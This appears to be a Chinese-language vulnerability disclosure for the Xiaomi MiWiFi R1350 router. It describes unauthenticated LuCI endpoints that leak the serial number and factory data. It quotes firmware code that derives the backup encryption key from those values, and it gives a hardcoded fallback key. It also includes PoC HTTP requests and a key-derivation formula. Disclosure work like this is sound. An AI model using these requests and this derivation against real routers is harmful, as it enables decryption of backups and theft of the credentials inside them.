# 小米 MiWiFi R1350 路由器

- 厂商：小米（Xiaomi）
- 产品：小米 AIoT 路由器 R1350（AC1200）
- 固件版本：1.0.31（miwifi_r1350_firmware_7449d_1.0.31.bin，QSDK / OpenWrt，MIPS32 大端）
- 漏洞类型：未授权泄露安全相关出厂数据 / 备份密钥材料（CWE-200）

## 概述

小米 MiWiFi R1350（固件 1.0.31）存在两个未授权接口（路由标志位 `0x09` = noauth + noinit），可向任意 LAN 侧客户端泄露出厂分区数据和设备安全状态：

```
GET /cgi-bin/luci/api/xqsystem/bdata     -> 完整的 "bdata show" 输出（SN、color、出厂标志等）
GET /cgi-bin/luci/api/xqsystem/fac_info  -> telnet/ssh/uart 开启标志、出厂模式、SSID
```

泄露的字段并非普通标识符：固件本身会从 `SN` + `color`（外加设备 MAC 地址）派生**配置备份加密密钥**，而小米官方的 **SSH root 密码**也是由设备 `SN` 派生的。因此该泄露直接提供了离线解密配置备份、计算 root 凭据所需的密钥材料，同时 `fac_info` 还可充当侦察通道，用于探明设备开放了哪些调试入口。

## 漏洞详情

### 1. 未授权暴露

`/usr/lib/lua/luci/controller/api/xqsystem.lua`（路由注册，标志位 `0x09`）：

![](./images/3-001.png)

```lua
entry({"api", "xqsystem", "fac_info"}, call("getFacInfo"), (""), 101, 0x09)
entry({"api", "xqsystem", "bdata"},    call("getBdataInfo"), (""), 101, 0x09)
```

`/usr/lib/lua/xiaoqiang/util/XQSysUtil.lua:1056` 不加任何过滤地返回 bdata 分区的**所有**键值对：

![](./images/3-002.png)

```lua
function bdataInfo()
    local str = LuciUtil.exec("bdata show")
    ... -- 将 "key=value" 行解析为 table，无白名单过滤
    LuciHttp.write_json(XQSysUtil.bdataInfo())
```

固件中已确认引用的敏感键：`SN`（`XQConfigs.lua:116 GET_BDATA_SN`、`XQBackup.lua:13`）、`color`（`XQBackup.lua:14`）、`CountryCode`（`XQCountryCode.lua:88`），以及出厂/SSID 相关键。

### 2. 影响链 A —— 配置备份解密（固件原始代码）

`/usr/lib/lua/xiaoqiang/module/XQBackup.lua:7-19`：

![](./images/3-003.png)

```lua
local function generate_key()
    local key = "7kl4n23mnm678m890s9dfklnmdqmwenq"        -- 硬编码兜底密钥
    sn    = string.sub(XQFunction.bdataGet("SN","0529486"), 1, 5)   -- <- 由 /bdata 泄露
    color = string.sub(XQFunction.bdataGet("color","1000"), 1, 3)   -- <- 由 /bdata 泄露
    mac1  = getmac | 第 1 个 MAC（小写，无冒号）                     -- <- 在以太网帧中可见
    mac2  = getmac | 第 2 个 MAC                                    -- <- 出厂 MAC 是连续的
    if sn ~= nil and color ~= nil and mac1 ~= nil and mac2 ~= nil then
        key = sn .. mac1 .. mac2 .. color                           -- 32 字节备份密钥
    end
    return key
end
```

加密备份（`/api/misystem/backup`）按同文件中的 `_mi_basic_info()` / `_mi_wifi_info()` / `_mi_network_info()` 打包了以下内容：

- **管理员账号密码哈希**（`uci account.common.admin`）
- **两个 Wi-Fi 的 SSID 和密码**
- **WAN 配置，包括 PPPoE 宽带用户名/密码**

攻击者从未授权接口拿到 `SN` 和 `color`，再从二层（Layer 2）观察到设备 MAC（出厂 MAC 是连续的），此后只要获得任意一个备份文件（用户分享的、云端同步的，或后续通过认证后入侵导出的），即可离线解密。如果 bdata 为空，固件会退回到一个**所有设备共用的硬编码密钥**。

### 3. 影响链 B —— SN 派生 root 密码侦察

小米官方的 SSH/telnet root 密码是设备 `SN` 的已知函数（已被公开逆向，存在现成计算器）。`fac_info` 则能在尝试之前告诉攻击者当前开放了哪些调试通道：

```json
{"telnet":false,"init":true,"wl0_ssid":"...","ssh":false,"version":"1.0.31","facmode":true,"4kblock":false,"wl1_ssid":"...","uart":false}
```

对于处于出厂模式的设备（`facmode:true`，telnet 已开启），泄露的 `SN` 可直接换算出 root 登录凭据。

## 漏洞证明（PoC）

```http
GET /cgi-bin/luci/api/xqsystem/bdata HTTP/1.1
Host: 192.168.31.1

```

```json
{" CountryCode":"CN","wl0_ssid":"Xiaomi_POC_5G","SN":"H2D0901907235","factory":"RTYPE RCC"}
```

```http
GET /cgi-bin/luci/api/xqsystem/fac_info HTTP/1.1
Host: 192.168.31.1

```

```json
{"telnet":false,"init":true,"wl0_ssid":"Xiaomi_POC_5G","ssh":false,"version":"1.0.31","facmode":true,"4kblock":false,"wl1_ssid":"Xiaomi_POC_2G","uart":false}
```

攻击者利用泄露值进行密钥材料派生（依据 `XQBackup.lua`）：

```
key = SN[0:5] + mac1(12 位十六进制) + mac2(12 位十六进制) + color[0:3]
```

## 影响

未授权的 LAN 侧攻击者可以获得设备派生以下两类秘密的确切材料（`SN`、`color`）：(a) 配置备份的加密密钥——备份中包含管理员密码哈希、Wi-Fi 密码和 PPPoE 宽带凭据；(b) telnet/SSH 所用的、由 SN 派生的官方 root 密码。同时 `fac_info` 还会暴露哪些入口是开放的。这使该泄露从“出厂元数据”升级为**凭据材料泄露**，实质性削弱了设备上存储的所有秘密的保密性。

## 复现结果

![](./images/3-004.png)

![](./images/3-005.png)

两个接口均在 qemu-mips + chroot 模拟的固件环境中（原始 nginx → fcgi-cgi → LuCI 栈）经过动态验证：请求不携带任何会话令牌，处理器输出如上所示原样返回（因模拟环境无出厂 NVRAM 分区，bdata 输出通过 wrapper 修正）。影响链 A 中引用的 `XQBackup.generate_key()` 派生逻辑为固件代码，已通过 `/usr/lib/lua/xiaoqiang/module/XQBackup.lua:7-19` 的静态分析确认。
